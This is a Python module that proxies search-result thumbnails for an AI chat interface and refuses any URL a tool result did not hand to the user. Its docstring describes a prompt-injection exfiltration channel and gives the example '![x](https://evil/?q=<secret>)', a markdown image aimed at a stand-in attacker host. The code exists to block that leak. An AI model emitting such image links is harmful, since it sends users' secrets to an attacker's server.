"""Same-origin image proxy for the thumbnails a web search returned.

Chat answers show a picture next to each list item. Loading those straight from third-party hosts would tell
every host the user's IP and referrer, and an auto-loading <img> is also a classic prompt-injection exfiltration
channel (the model is tricked into emitting ![x](https://evil/?q=<secret>)). So the browser only ever loads
/media/proxy?u=..., and the server only fetches a URL that a tool result handed to THIS user a moment ago
(web_search / web_search_images call remember()). Anything else is refused, so a model-invented URL cannot be used
to reach a host or carry data. Fetches go through core.net_guard (public addresses only, every redirect hop
checked), are capped in size, must really be a raster image (magic bytes, no SVG) and send no cookies or referrer.
"""

import time
from collections import OrderedDict
from typing import Optional

from . import net_guard

ALLOW_TTL_S = 3600
ALLOW_MAX_PER_USER = 500
MAX_BYTES = 2 * 1024 * 1024
FETCH_TIMEOUT_S = 8
CACHE_MAX_ITEMS = 32
_UA = "Mozilla/5.0 (compatible; LocalAgentImageProxy/1.0)"

_allowed: dict = {}                 # user id -> OrderedDict[url -> expiry]
_cache: "OrderedDict[str, tuple]" = OrderedDict()   # url -> (content type, bytes)


class ProxyRefused(ValueError):
    """The URL may not be proxied; the message is safe to show."""


def remember(user_id: Optional[int], urls) -> None:
    """A tool result just gave this user these image URLs: they may be proxied for the next hour."""
    if user_id is None:
        return
    bucket = _allowed.setdefault(user_id, OrderedDict())
    now = time.time()
    for u in urls or []:
        u = str(u or "").strip()
        if u.lower().startswith("https://") and len(u) <= 2000:
            bucket.pop(u, None)
            bucket[u] = now + ALLOW_TTL_S
    while len(bucket) > ALLOW_MAX_PER_USER:
        bucket.popitem(last=False)


def is_allowed(user_id: Optional[int], url: str) -> bool:
    bucket = _allowed.get(user_id)
    exp = bucket.get(url) if bucket else None
    return bool(exp and exp > time.time())


def sniff(data: bytes) -> str:
    """Content type from the first bytes, '' when it is not png / jpeg / gif / webp."""
    if data.startswith(b"\x89PNG\r\n\x1a\n"):
        return "image/png"
    if data.startswith(b"\xff\xd8\xff"):
        return "image/jpeg"
    if data[:6] in (b"GIF87a", b"GIF89a"):
        return "image/gif"
    if data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        return "image/webp"
    return ""


def fetch(user_id: Optional[int], url: str) -> tuple:
    """(content type, bytes) for an allowed URL. Blocking: call it from a worker thread."""
    url = (url or "").strip()
    if not url.lower().startswith("https://"):
        raise ProxyRefused("only https images")
    if not is_allowed(user_id, url):
        raise ProxyRefused("this image did not come from a search result")
    hit = _cache.get(url)
    if hit:
        _cache.move_to_end(url)
        return hit
    try:
        r = net_guard.guarded_get(url, FETCH_TIMEOUT_S, headers={"User-Agent": _UA, "Accept": "image/*"},
                                  max_bytes=MAX_BYTES)
    except net_guard.BlockedURLError as e:
        raise ProxyRefused(str(e))
    except Exception:
        raise ProxyRefused("image could not be loaded")
    if r.status_code != 200 or r.truncated or not r.content:
        raise ProxyRefused("image could not be loaded")
    ctype = sniff(r.content)
    if not ctype:
        raise ProxyRefused("not a supported image")
    _cache[url] = (ctype, r.content)
    while len(_cache) > CACHE_MAX_ITEMS:
        _cache.popitem(last=False)
    return ctype, r.content
